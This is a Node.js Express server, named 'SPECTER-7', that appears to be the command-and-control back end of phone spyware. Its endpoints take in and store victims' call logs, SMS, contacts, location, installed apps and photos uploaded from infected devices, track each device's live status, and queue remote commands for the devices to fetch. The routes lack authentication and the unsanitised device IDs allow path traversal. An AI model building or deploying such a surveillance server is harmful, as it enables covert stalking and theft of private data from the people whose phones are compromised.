const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '200mb' }));
app.use(express.static('public'));

const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const devicesFile = path.join(dataDir, 'devices.json');
if (!fs.existsSync(devicesFile)) {
    fs.writeFileSync(devicesFile, '[]');
}

app.post('/upload.php', (req, res) => {
    try {
        const data = req.body;
        
        if (data.type === 'image_data' && data.file_data) {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const imagesFile = path.join(deviceDir, 'images_data.json');
            let imagesData = [];
            if (fs.existsSync(imagesFile)) imagesData = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
            
            const exists = imagesData.find(img => img.name === data.file_name);
            if (!exists) {
                imagesData.push({ name: data.file_name, path: data.file_path, data: data.file_data, size: data.file_size, date: data.timestamp });
            }
            
            fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
            updateDevicesList(deviceId);
            return res.json({ success: true, images_count: imagesData.length });
        }
        
        const deviceId = data.device_id || 'unknown';
        const deviceDir = path.join(dataDir, deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
            fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true });
        }
        
        const dataFilePath = path.join(deviceDir, 'data.json');
        let existingData = {};
        if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
        
        if (data.type === 'all' && data.data) {
            if (data.data.call_logs) existingData.call_logs = data.data.call_logs;
            if (data.data.sms) existingData.sms = data.data.sms;
            if (data.data.contacts) existingData.contacts = data.data.contacts;
            if (data.data.location) existingData.location = data.data.location;
            if (data.data.device_info) existingData.device_info = data.data.device_info;
            if (data.data.installed_apps) existingData.installed_apps = data.data.installed_apps;
            existingData.timestamp = Date.now();
        }
        
        fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
        updateDevicesList(deviceId);
        res.json({ success: true });
    } catch (e) {
        res.json({ error: e.message });
    }
});

app.post('/live_update.php', (req, res) => {
    try {
        const data = req.body;
        const deviceId = data.device_id || 'unknown';
        const deviceDir = path.join(dataDir, deviceId);
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        
        const liveFile = path.join(deviceDir, 'live.json');
        let live = {};
        if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
        
        live.network = data.network || 'متصل';
        live.battery = data.battery || null;
        live.location = data.location || null;
        live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
        
        fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
        updateDevicesList(deviceId);
        res.json({ success: true });
    } catch (e) {
        res.json({ error: e.message });
    }
});

app.get('/live.php', (req, res) => {
    try {
        const deviceId = req.query.device;
        if (!deviceId) return res.json({ error: 'Device ID required' });
        
        const liveFile = path.join(dataDir, deviceId, 'live.json');
        const dataFile = path.join(dataDir, deviceId, 'data.json');
        
        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999 };
        
        if (fs.existsSync(liveFile)) {
            const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
            const lastSeen = live.last_seen || 0;
            response = { online: (Math.floor(Date.now()/1000) - lastSeen) < 30, network: live.network || 'غير معروف', battery: live.battery || null, location: live.location || null, last_seen: lastSeen, seconds_ago: Math.floor(Date.now()/1000) - lastSeen };
        }
        
        if (fs.existsSync(dataFile)) {
            const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
            response.call_count = (allData.call_logs || []).length;
            response.sms_count = (allData.sms || []).length;
            response.contacts_count = (allData.contacts || []).length;
            response.apps_count = (allData.installed_apps || []).length;
        }
        
        const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
        if (fs.existsSync(imagesFile)) response.images_count = JSON.parse(fs.readFileSync(imagesFile, 'utf8')).length;
        
        res.json(response);
    } catch (e) {
        res.json({ error: e.message });
    }
});

app.get('/api.php', (req, res) => {
    try {
        const action = req.query.action;
        const deviceId = req.query.device;
        const type = req.query.type;
        
        if (action === 'delete_device') {
            const deviceDir = path.join(dataDir, deviceId);
            if (fs.existsSync(deviceDir)) fs.rmSync(deviceDir, { recursive: true, force: true });
            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
            devices = devices.filter(d => d.id !== deviceId);
            fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
            return res.json({ success: true });
        }
        
        if (action === 'get_image_data') {
            const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
            if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'get_data') {
            const dataFile = path.join(dataDir, deviceId, 'data.json');
            if (fs.existsSync(dataFile)) {
                const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
                if (type && type !== 'all' && allData[type]) return res.json(allData[type]);
                return res.json(allData);
            }
            return res.json([]);
        }
        
        if (action === 'get_commands') {
            const commandsFile = path.join(dataDir, deviceId, 'commands.json');
            if (fs.existsSync(commandsFile)) {
                const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
                fs.writeFileSync(commandsFile, '[]');
                return res.json({ commands });
            }
            return res.json({ commands: [] });
        }
        
        res.json({ error: 'Invalid action' });
    } catch (e) {
        res.json({ error: e.message });
    }
});

app.post('/api.php', (req, res) => {
    try {
        const { device, command } = req.body;
        if (!device || !command) return res.json({ error: 'Device and command required' });
        
        const deviceDir = path.join(dataDir, device);
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        
        const commandsFile = path.join(deviceDir, 'commands.json');
        let commands = [];
        if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
        commands.push({ command, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
        fs.writeFileSync(commandsFile, JSON.stringify(commands));
        res.json({ success: true });
    } catch (e) {
        res.json({ error: e.message });
    }
});

app.get('/devices.json', (req, res) => {
    try {
        res.json(JSON.parse(fs.readFileSync(devicesFile, 'utf8')));
    } catch (e) {
        res.json([]);
    }
});

function updateDevicesList(deviceId) {
    let devices = [];
    if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
    const index = devices.findIndex(d => d.id === deviceId);
    if (index >= 0) devices[index].last_seen = Math.floor(Date.now()/1000);
    else devices.push({ id: deviceId, first_seen: Math.floor(Date.now()/1000), last_seen: Math.floor(Date.now()/1000) });
    fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
}

app.listen(PORT, () => console.log(`SPECTER-7 running on ${PORT}`));
